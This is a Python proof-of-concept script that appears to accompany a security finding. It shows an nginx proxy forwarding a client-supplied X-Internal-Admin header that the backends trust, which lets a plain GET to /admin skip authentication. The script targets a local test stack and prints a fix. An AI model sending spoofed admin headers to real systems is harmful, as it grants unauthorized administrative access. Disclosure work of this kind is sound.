#!/usr/bin/env python3
"""
Demonstrates the documented finding in ../docs/findings.md:
proxy/nginx.conf forwards the client's own X-Internal-Admin header
straight through ($http_x_internal_admin), and server-a/server-b both
trust that header to skip authentication on /admin entirely.

Run this against your own local nginx + server-a/server-b stack only.

Usage:
    python3 admin_header_bypass.py [--host 127.0.0.1] [--port 8080]
"""
import argparse
import http.client


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    conn = http.client.HTTPConnection(args.host, args.port, timeout=5)
    try:
        conn.request("GET", "/admin", headers={"X-Internal-Admin": "true"})
        resp = conn.getresponse()
        body = resp.read().decode(errors="replace")
    finally:
        conn.close()

    print(f"GET /admin with X-Internal-Admin: true -> {resp.status} {resp.reason}")
    print(body)

    if resp.status == 200:
        print(
            "\nConfirmed: the proxy forwarded the client-supplied header and "
            "the backend trusted it, bypassing auth entirely."
        )
        print(
            "Fix: have the proxy set or clear this header itself, e.g. "
            '`proxy_set_header X-Internal-Admin "";` instead of forwarding '
            "$http_x_internal_admin."
        )


if __name__ == "__main__":
    main()
